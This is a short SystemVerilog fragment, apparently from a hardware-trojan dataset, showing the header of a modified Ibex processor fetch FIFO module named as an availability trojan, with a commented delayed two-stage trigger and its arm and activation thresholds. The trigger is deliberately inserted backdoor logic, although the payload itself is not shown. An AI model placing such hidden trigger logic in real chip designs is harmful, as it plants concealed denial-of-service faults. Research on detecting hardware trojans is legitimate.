...
module ibex_fetch_fifo_trojan_Availability #(
  ...
  output logic                out_err_plus2_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=7335, act=3667)
    // ============================================================
    localparam int ARM_THRESHOLD   = 7335;
    localparam int ACTIVATE_DELAY  = 3667;
